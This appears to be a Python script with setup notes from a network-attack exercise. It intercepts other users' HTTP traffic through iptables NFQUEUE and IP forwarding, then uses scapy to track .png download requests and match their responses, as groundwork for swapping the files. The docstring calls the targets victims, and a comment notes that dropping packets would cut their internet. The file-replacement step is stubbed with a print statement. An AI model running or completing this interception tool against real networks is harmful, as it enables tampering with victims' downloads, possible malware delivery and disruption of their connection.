#!/usr/bin/env python
"""
first of all issue this command to trap victim's requests and this library to modify net filter queue
1- 
    1-1 iptables -I FORWARD -j NFQUEUE --queue-num 0
    1-2 after we are done do this to nullify iptables: iptables --flush

2- 
    2-1 pip install netfilterqueue
    2-2 if failed, try this first: apt install libnfnetlink-dev libnetfilter-queue-dev
3- echo 1 > /proc/sys/net/ipv4/ip_forward
============================================
in case when we want to check out on our local computer:
1- iptables -I OUTPUT -j NFQUEUE --queue-num 0
2- iptables -I INPUT -j NFQUEUE --queue-num 0
3- after done, iptables --flush

"""

import netfilterqueue
import scapy.all as scapy

ack_list = []

def processPacket(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            #print("HTTP Request")
            if b".png" in scapy_packet[scapy.Raw].load:
                print("[+] png request found...")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            #print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing file")
            print(scapy_packet.show())

    
    #packet.drop() #cut the internet of victim
    packet.accept() #it will simply direct packets to their destination

#creating an instance of netfilterque object
queue = netfilterqueue.NetfilterQueue() 

#to bind the queue with the queue that we have created with iptabls
queue.bind(0, processPacket)
queue.run()